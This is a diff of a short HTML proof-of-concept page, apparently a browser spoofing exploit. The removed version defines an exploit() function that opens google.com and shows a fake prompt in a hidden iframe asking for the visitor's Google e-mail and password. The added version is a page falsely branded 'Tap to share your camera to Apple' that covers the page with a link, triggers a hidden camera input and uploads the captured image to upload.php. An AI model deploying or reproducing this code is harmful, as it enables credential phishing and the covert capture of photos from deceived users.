@@ -1,25 +1,62 @@
-<html>
-  <body>
 
-    <script>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    function exploit() {
-
-      window.open("https://www.google.com");
-
-      document.getElementById("iframe").src = 'javascript:prompt("In order to access Google.com\\nyou must first login on your\\nGoogle Account.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
-    
+<style>
+    h1 {
+        margin: 1em;
     }
-    
-    </script>
 
-    <br><br><br><br>
+    a {
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+    }
 
-    <a href="#" onclick="exploit();">
-      <center><h1>Click here to go to Google.com</h1></center>
-    </a>
+    input {
+        display: none;
+    }
 
-    <iframe styleframeborder="0" style="width:0;height:0;" id="iframe" src=""></iframe>
+    img {
+        width: 100%;
+    }
+</style>
 
-  </body>
-</html>
+<h1>Tap to share your camera to Apple</h1>
+
+<input id="fileSelect" type="file" accept="image/*" capture="camera" style="display:none;" />
+
+<img id="img" src="">
+<a id="link" href="https://google.com" target="_blank">Tap to open camera</a>
+
+<script>
+    document.getElementById('link').onclick = () => {
+        setTimeout(() => {
+            document.getElementById('fileSelect').click();
+        }, 600);
+    };
+
+    document.getElementById('fileSelect').onchange = (event) => {
+        const file = event.target.files[0];
+        if (file) {
+            const img = document.getElementById('img');
+            img.src = URL.createObjectURL(file);
+
+            const formData = new FormData();
+            formData.append('file', file);
+
+            fetch('upload.php', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.text())
+            .then(result => {
+                console.log('Success:', result);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+    };
+</script>
